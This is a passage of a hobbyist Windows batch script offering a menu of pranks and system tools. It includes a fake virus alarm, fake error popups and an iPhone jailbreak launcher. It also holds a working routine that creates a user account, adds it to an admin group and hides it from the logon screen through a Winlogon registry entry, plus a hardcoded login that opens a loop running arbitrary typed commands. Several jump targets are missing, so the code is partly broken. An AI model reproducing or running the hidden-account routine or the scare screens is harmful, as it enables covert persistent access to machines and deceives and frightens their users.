echo Tries Left: 1
set/p password=Password?:
if %password%==%pass% goto login
echo.
cls
echo Invalid Password. Please Try Again.
echo.
pause
cls
goto Password17
cls
if %time% EQU 0 goto begin
echo Tries Left: 0
set/p password=Password?:
if %password%==%pass% goto login
echo.
cls
echo Invalid Password. Please Try Again.
echo.
pause
goto endingish

:login
cls
set /p username=UserName:
if %username% EQU RedTop goto Z
if %username% EQU redtop goto Z
if %username% EQU Chris goto A
if %username% EQU chris goto A
cls
color 0a
title %username%
echo {%username%}

:F
set /p ver5=
goto F

:Z
cls
echo Loading Settings.
cls
echo Loading Settings..
cls
echo Loading Settings...
cls
echo Loading Settings....
cls
echo Loading Settings.....
cls
echo Loading Settings.
cls
echo Loading Settings..
cls
echo Loading Settings...
cls
echo Loading Settings....
cls
echo Loading Settings.....
ping localhost > NUL
cd \
tree
ping localhost > NUL
ping localhost > NUL
cls
set /p ver2=
if %ver2% EQU Chris goto A
goto Z

:A
color 4
title Christopher
cls
echo ------------------------------------------------------------------
echo --------------------HELLO %username%.----------------------------------
echo ------------------------------------------------------------------
set /p ver3=:
if %ver3% EQU password goto B2
exit

:B2
cls
echo Password Correct
:ren
set abc=1000

:C
set /p ver4=:
set /a abc=abc-1
if %abc% EQU 0 exit
%ver4%
goto C

:fakevirus
cls
title MILLENIUM WORM VIRUS
color 04
echo YOU HAVE A VIRUS ON YOUR COMPUTER.
pause
echo WE ARE CONTACTING ANTIVIRUS
pause 
cls
echo ACCESS DENIED
echo ACCESS DENIED
echo ACCESS DENIED
echo ACCESS DENIED
echo ACCESS DENIED
pause
echo Activating Virus.
cls
echo Activating Virus..
cls
echo Activating Virus...
pause
echo Virus ACTIVATED!!!
pause
:1
dir/s
goto 1

:destroy2012
start iexplore http://www.netdisaster.com
cls
goto begin

:googletricks
pause
echo Hello Guys This Is Some Cool Google Tricks. [THEY ARE IN THE BRACKETS]
echo Go To Google And Type [Google Hacker] Then Click Im Feeling Lucky
echo Go To Google And Type [Google Emo] Then Click Im Feeling Lucky
echo Go To Google And Type [Google Ninja] Then Click Im Feeling Lucky
echo Go To Google And Type [Google Gangster] Then Click Im Feeling Lucky
echo Go To Google And Type [Google Metal] Then Click Im Feeling Lucky
echo Go To Google And Type [Google God] Then Click Im Feeling Lucky
echo Go To Google And Type [Google Dark] Then Click Im Feeling Lucky
pause
cls
goto endingish

:HEADER
@ECHO off
TITLE Admin account creator (PandaRetail / PandaRetail)
COLOR 0f
set AC_PART=001
echo.
ECHO   [INFO]
ECHO   [-] Create a hidden user acount (U:%AC_NAME%; P:%AC_PASS%; G:%AC_GROUP%; H:%AC_HIDE% )
echo     \
GOTO %AC_PART%


:001
ECHO   [-] Create a hidden user acount (U:%AC_NAME%; P:%AC_PASS%; G:%AC_GROUP%; H:%AC_HIDE% )
SET /P AC_NAME=[*] Acount name? :
cls
SET AC_PART=002
GOTO 002


:002
ECHO   [-] Create a hidden user acount (U:%AC_NAME%; P:%AC_PASS%; G:%AC_GROUP%; H:%AC_HIDE% )
SET /P AC_PASS=[*] Acount password? :
cls
SET AC_PART=003
GOTO 003

:003
ECHO   [-] Create a hidden user acount (U:%AC_NAME%; P:%AC_PASS%; G:%AC_GROUP%; H:%AC_HIDE% )
SET /P AC_COMMENT=[*] Acount Comment? :
cls
SET AC_PART=004
GOTO 004


:004
ECHO   [-] Create a hidden user acount (U:%AC_NAME%; P:%AC_PASS%; G:%AC_GROUP%; H:%AC_HIDE% )
ECHO     [* The following groups are available on the machine.
ECHO.
net localgroup | find "*"
ECHO.
SET /P AC_GROUP=[*] Group? :
cls
SET AC_PART=005
GOTO 005


:005
SET /P AC_OK=[*] Creating acount now, Continue? (y/n) :
IF NOT %AC_OK%==y GOTO 0051
net user %AC_NAME% %AC_PASS% /add /COMMENT:"%AC_COMMENT%"
net localgroup "%AC_GROUP%" %AC_NAME% /add
ECHO.
pause

:0051
cls
SET AC_PART=006
GOTO begin


:006
SET /P AC_HIDE=[*] Do you want to hide the acount from the XP logon screen? (y/n) :
IF NOT %AC_HIDE%==y GOTO END
echo Windows Registry Editor Version 5.00>%TEMP%\addregistry.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 

NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]>>%TEMP%\addregistry.reg
echo "%AC_NAME%"=dword:00000000>>%TEMP%\addregistry.reg
Regedit /s %TEMP%\addregistry.reg
Del %TEMP%\addregistry.reg
:END
ECHO.
pause

:unlockadmin
net user administrator /active:yes
pause
goto endingish

:delockadmin
net user administrator /active:no
pause
goto endingish

:bootchange
Bcdedit
cls
goto endingish

:copyboot
Bcdboot
cls
goto endingish

:audit
Auditpol
cls
goto endingish

:attributes
Attrib
cls
goto endingish

:arp
arp
cls
goto endingish

:jailbreak
pause
cls
echo.
echo You will need some files to do this. 
echo [1] Download Files
echo [2] Start My Jailbreak [Only After You Have Downloaded The Files]
echo [e] Main menu
echo.
echo *********************************************************************
echo Enter the number of the you would like to do:
echo.
set /p udefine= 
echo.
echo ***************************************************************
if %udefine%==1 goto link
if %udefine%==! goto link
if %udefine%==2 goto jailbreak1
if %udefine%==@ goto jailbreak1
if %udefine%==e goto jailbreak2
if %udefine%==E goto jailbreak2

:link
echo Click Any Key To Download The Jailbreaking Files
pause
echo SORRY. THE LINK IN NOT AVAILABLE BECAUSE IT DOES NOT WORK ANYMORE	
pause
cls
goto begin

:jailbreak1
CLS
COLOR 10
CLS
@ECHO OFF
 
ECHO Batch Installer by PandaRetail - JB by iPhoneDevTeam
ECHO.
ECHO - Supports iPhone 4S and iPad 2
ECHO.
ECHO - MUST HAVE YOUR IPHONE OR IPAD 2 PLUGGED IN.
ECHO.
ECHO - INSTRUCTIONS -
ECHO.
ECHO Step 1. - After Pressing a Key you will see a screen that asks you to install a profile, install the Profile (leave the password box blank)
ECHO.
ECHO Step 2. - When the installer on your computer says installing file mover, then turn on your VPN setting in "Settings->Network->VPN" and your phone or iPad2 will restart
ECHO.
ECHO Step 3. - Once your phone or iPad 2 has restarted, find cydia in your apps, and if you do, click it and your done!
ECHO.
ECHO Press Any Key to Begin Untethered Jailbreak Process of your iPhone 4S or iPad 2!
pause>null
CLS
COLOR 05
cinject -i payloads/jailbreak.mobileconfig
cinject -j payloads
cinject -w
REM - DONE!
pause
goto jailbreak2

:jailbreak2
cls
echo \\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///
echo.
echo Thank You for using our IPhone 4S And iPad 2 Jailbreak Service
echo --------------------------------------------------------------------------------
echo.
echo  ///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\///\\\
pause
cls
goto endingish

:editcmdd
title Edit By RMz-Panda
edit.com
cls
goto endingish

:progressbar
echo.
echo.
echo                Rebuilding.
echo   ----------------------------------
echo   Progress: ²²²²²²²²²²²²²²²²²²²² 1%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding..
echo   ----------------------------------
echo   Progress: Û²²²²²²²²²²²²²²²²²²² 3%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding...
echo   ----------------------------------
echo   Progress: Û²²²²²²²²²²²²²²²²²²² 5%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding.
echo   ----------------------------------
echo   Progress: ÛÛ²²²²²²²²²²²²²²²²²² 10%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding..
echo   ----------------------------------
echo   Progress: ÛÛÛ²²²²²²²²²²²²²²²²² 15%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding...
echo   ----------------------------------
echo   Progress: ÛÛÛÛ²²²²²²²²²²²²²²²² 20%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding.
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛ²²²²²²²²²²²²²²² 25%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding..
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛ²²²²²²²²²²²²²² 30%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding...
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛ²²²²²²²²²²²²² 35%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding.
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛ²²²²²²²²²²²² 40%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding..
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛ²²²²²²²²²²² 45%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding...
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛ²²²²²²²²²² 50%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding.
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛÛ²²²²²²²²² 55%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding..
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛÛÛ²²²²²²²² 60%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding...
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛÛÛÛ²²²²²²² 65%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding.
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛÛÛÛÛ²²²²²² 70%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding..
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ²²²² 80%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding...
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ²²² 85%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding.
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ²² 90%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding..
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ² 95%%
PING 123.123.1.123 -n 1 -w 1500 >NUL
cls
echo.
echo.
echo                Rebuilding...
echo   ----------------------------------
echo   Progress: ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ 100%%
PING 123.123.1.123 -n 1 -w 65000 >NUL

GOTO END213

:END213
cls
echo.
echo.
echo   Rebuilding complete!
echo.
echo   Test Complete
echo.
echo    Click ENTER To Go Back
pause>NUL
goto endish

:windowserror321
cls
echo Header is the title of the windows error
echo.
echo Discription Is What You Will See
echo.
echo Numbers : 
echo 0 - ok button only
echo 1 - ok and cancel
echo 2 - abort, retry and ignore
echo 3 - yes no and cancel
echo 4 - yes and no
echo 5 - retry and cancel
echo.
echo Error Logo : 
echo 16 - critical message icon
echo 32 - warning icon
echo 48 - warning message
echo 64 - info message
echo.
set input321=
set /p input321= Please Put A Header For It : 
set input322=
set /p input322= Please Put A Discription : 
set input323=
set /p input323= Please Put A Number(TOP) : 
set input324=
set /p input324= Please Put What Kind Of Error Logo(TOP) : 
echo X=MsgBox("%input322%", %input323%+%input324%, "%input321%") >> error.vbs
start error.vbs
goto endingish

:endingish
echo Please Press Any Key So It Will Delete This File. Its Really Good For Pranking.
pause
del error.vbs
goto endish

:batchcolorchanger
cls
echo.
echo Use Any Number/Letter For The Primary And Secondary Color
echo.
echo 0 = Black             8 = Grey
echo 1 = Blue              9 = Light Blue
echo 2 = Green             A = Light Green
echo 3 = Aqua              B = Light Aqua
echo 4 = Red               C = Light Red
echo 5 = Purple            D = Light Purple
echo 6 = Yellow            E = Light Yellow
echo 7 = White             F = Bright White
echo.
set /p colorP=Primary : 
set /p colorS=Secondary : 
color %colorP%%colorS%
goto endish

:setuseradmin212
@echo off 
cls
setlocal 
set _Admin_=%COMPUTERNAME%\Administrator 
set _Group_=Administrators 
set _Prog_="cmd.exe /k Title *** %* as Admin *** && cd c:\ && color 4F" 
set _User_=%USERDOMAIN%\%USERNAME% 

if "%*"=="" ( 
runas /u:%_Admin_% "%~s0 %_User_%" 
if ERRORLEVEL 1 echo. && pause 
) else ( 
echo Adding user %* to group %_Group_%... 
net localgroup %_Group_% "%*" /ADD 
if ERRORLEVEL 1 echo. && pause 
echo. 
echo Starting program in new logon session... 
runas /u:"%*" %_Prog_% 
if ERRORLEVEL 1 echo. && pause 
echo. 
echo Removing user %* from group %_Group_%... 
net localgroup %_Group_% "%*" /DELETE 
if ERRORLEVEL 1 echo. && pause 
) 
endlocal
pause>NUL
goto endish1

:endish1
cls
echo Would You Like To Continue Or End?
set /p continueorquit1=Pick One(Y/N) : 
if "%continueorquit1%"=="y" goto begin2
if "%continueorquit1%"=="Y" goto begin2
if "%continueorquit1%"=="yes" goto begin2
if "%continueorquit1%"=="Yes" goto begin2
if "%continueorquit1%"=="n" goto exit4
if "%continueorquit1%"=="N" goto exit4
if "%continueorquit1%"=="no" goto exit4
if "%continueorquit1%"=="No" goto exit4
echo.
echo.
echo Invailid imput. Please try again!
echo.
goto endish1

:forcestop
cls
Set force=
set /p force=Type The Name Of The Program : 
set Stop=
set /p stop=Type The Type Of File Ex.(.exe, .txt)[Include DOT] : 

taskkill /f /im %force%%stop%
goto endish1

:test21212121
cls
Set testmake=
set /p testmake=Type What You Want To Be Viewed : 
cls
echo %testmake%>> test.txt
for /f "Delims=" %%a in (test.txt) do (
echo %%a
)
echo PRESS ANY KEY TO CONTINUE.. When you click any key in the CMD file, it will delete this text file. >> continue212.txt
start continue212.txt
pause>NUL
del test.txt
del continue212.txt
goto endish1

:tasklistenable
tasklist
pause>NUL
goto endish1